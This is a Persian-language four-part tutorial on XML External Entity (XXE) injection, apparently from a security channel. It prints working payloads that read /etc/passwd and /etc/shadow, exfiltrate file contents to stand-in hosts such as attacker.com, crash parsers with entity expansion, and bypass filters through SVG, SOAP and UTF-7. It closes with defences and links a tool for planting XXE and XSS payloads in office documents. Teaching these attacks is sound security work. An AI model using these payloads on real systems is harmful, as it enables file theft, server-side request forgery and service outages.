📌 حملات XXE (تزریق XML) - بخش اول  

🔹حمله XXE چیست؟  
حملۀ XXE (XML External Entity Injection) یک آسیب‌پذیری امنیتی در پردازش داده‌های XML است که به مهاجم اجازه می‌دهد به فایل‌های سیستم سرور دسترسی پیدا کند یا با سیستم‌های backend تعامل داشته باشد. در برخی موارد، این آسیب‌پذیری می‌تواند منجر به حمله‌های جعل درخواست سمت سرور (SSRF) یا حتی اختلال در سرویس (DoS) شود.  

🔹 انواع حملات XXE   
1. استخراج فایل‌ها (مثلاً خواندن /etc/passwd)  
2. حملات SSRF (ارسال درخواست به سیستم‌های داخلی)  
3. انتقال داده‌ها به صورت خارج از باند (OOB)  
4. استخراج داده از طریق پیام‌های خطا  

🔹 مثال ساده از XXE:  
<?xml version="1.0"?>
<!DOCTYPE foo [<!ENTITY xxe SYSTEM "file:///etc/passwd">]>
<foo>&xxe;</foo>
در این مثال، مهاجم محتوای فایل /etc/passwd را می‌خواند.  

📌 حملات XXE (تزریق XML) - بخش دوم  

🔹 حملات پیشرفته XXE  

 1. حملات Blind XXE (انتقال داده به صورت خارج از باند)  
در برخی موارد، برنامه پاسخ مستقیمی نشان نمی‌دهد، اما مهاجم می‌تواند داده‌ها را به یک سرور تحت کنترل خود منتقل کند.  

مثال:  
<?xml version="1.0"?>
<!DOCTYPE foo [
  <!ENTITY % xxe SYSTEM "file:///etc/passwd">
  <!ENTITY blind SYSTEM "http://attacker.com/?%xxe;">
]>
<foo>&blind;</foo>
در این حالت، محتوای /etc/passwd به سرور مهاجم ارسال می‌شود.  

2. دور زدن کنترل‌های دسترسی (PHP Example)  
با استفاده از فیلترهای PHP، می‌توان فایل‌های محدودشده را خواند:  
<?xml version="1.0"?>
<!DOCTYPE foo [
  <!ENTITY ac SYSTEM "php://filter/read=convert.base64-encode/resource=/etc/shadow">
]>
<foo>&ac;</foo>
(در این مثال، فایل /etc/shadow به صورت base64 کدگذاری و خوانده می‌شود.)  

 3. حملات DoS با XXE 
بعضی از payloadهای XXE می‌توانند باعث مصرف بیش از حد منابع سرور شوند:  
<?xml version="1.0"?>
<!DOCTYPE lolz [
  <!ENTITY lol "lol">
  <!ENTITY lol1 "&lol;&lol;&lol;&lol;&lol;&lol;&lol;">
  <!ENTITY lol2 "&lol1;&lol1;&lol1;&lol1;&lol1;&lol1;&lol1;">
  ...
]>
<lolz>&lol9;</lolz>
این حمله باعث ایجاد حجم زیادی از داده‌های تکراری و crash سرور می‌شود.  

📌 حملات XXE (تزریق XML) - بخش سوم  

🔹 حملات پیشرفته XXE (ادامه)  

4. استفاده از XXE در فایل‌های SVG (حملات از طریق تصاویر)  
فایل‌های SVG مبتنی بر XML هستند و می‌توانند حاوی payloadهای XXE باشند:  
<svg xmlns="http://www.w3.org/2000/svg" xmlns:xlink="http://www.w3.org/1999/xlink" width="300" height="200">
    <image xlink:href="expect://id"></image>
</svg>
اگر سایتی آپلود SVG را بدون فیلتر کردن اجازه دهد، این payload می‌تواند دستورات سیستم را اجرا کند.  

5. استفاده از XXE در پروتکل SOAP (سرویس‌های وب)  
در APIهای SOAP-based نیز می‌توان از XXE سوءاستفاده کرد:  
<soap:Body>
  <foo>
    <![CDATA[<!DOCTYPE doc [<!ENTITY % dtd SYSTEM "http://attacker.com/"> %dtd;]><xxx/>]]>
  </foo>
</soap:Body>
این payload درخواستی به سرور مهاجم ارسال می‌کند.  

6. استفاده از کدگذاری UTF-7 برای دور زدن فیلترها  
بعضی سیستم‌ها فقط UTF-8 را پردازش می‌کنند، اما با UTF-7 می‌توان برخی فیلترها را دور زد:  
<?xml version="1.0" encoding="UTF-7"?>
+ADwAIQ-DOCTYPE foo+AFs +ADwAIQ-ELEMENT foo ANY +AD4
+ADwAIQ-ENTITY xxe SYSTEM +ACI-http://hacker.com/+ACI +AD4AXQA+
+ADw-foo+AD4AJg-xxe+ADsAPA-/foo+AD4

🔹 جمع‌بندی بخش سوم  
- درون SVGها می‌توانند حاوی XXE باشند.  
-حتی APIهای SOAP نیز در معرض خطرند.  
- با تغییر کدگذاری (مثل UTF-7) می‌توان برخی فیلترها را دور زد.  

ادامه در بخش چهارم (پیشگیری و دفاع)...

📌 حملات XXE (تزریق XML) - بخش چهارم (پایانی)  

🔹 روش‌های پیشگیری و دفاع در برابر XXE  

1. غیرفعال کردن پردازش موجودیت‌های خارجی (External Entities)  
در اکثر پردازشگرهای XML (مثل PHP, Java, .NET)، می‌توان این ویژگی را غیرفعال کرد:  

مثال در PHP:  
libxml_disable_entity_loader(true);

مثال در Python (lxml):  
parser = etree.XMLParser(resolve_entities=False)

2. استفاده از Whitelisting برای ورودی‌های XML  
- فقط اجازه‌دهید المان‌ها و attributeهای مورد اعتماد پردازش شوند.  
- از اسکیماهای معتبر (XSD) برای اعتبارسنجی ساختار XML استفاده کنید.  

3. فیلتر کردن محتوای خطرناک  
- بلوک کردن <!DOCTYPE و <!ENTITY در ورودی کاربر.  
- مسدود کردن پروتکل‌های خطرناک مثل file://, php://, expect://.  

4. به‌روزرسانی کتابخانه‌های پردازش XML  
بسیاری از آسیب‌پذیری‌های XXE در نسخه‌های قدیمی کتابخانه‌ها (مثل libxml2) وجود دارند.  

5. استفاده از فرمت‌های جایگزین (JSON به جای XML)  
در بسیاری از موارد، استفاده از JSON به جای XML می‌تواند خطر XXE را حذف کند.  

🔹 نتیجه‌گیری  
حملات XXE می‌توانند منجر به خواندن فایل‌های حساس، حملات SSRF و حتی اختلال در سرویس (DoS) شوند. با غیرفعال کردن موجودیت‌های خارجی و اعتبارسنجی دقیق ورودی‌ها، می‌توان از این حملات جلوگیری کرد.  

✅ امن‌تر کدنویسی کنید! ✅  

✍️نویسنده 
@TryHackBox | The Chaos

#XXE #Prevention #CyberSecurity


===================================

ابزار docem ابزاری است که برای گنجاندن Payloadهای XXE  و XSS در قالب‌های سندی مانند docx, odt, pptx, xlsx استفاده می‌شود. این فرمت‌های سند در واقع فایل‌های ZIP حاوی فایل‌های XML هستند؛ به همین دلیل امکان تزریق این نوع حملات وجود دارد.

https://github.com/whitel1st/docem

=====================================
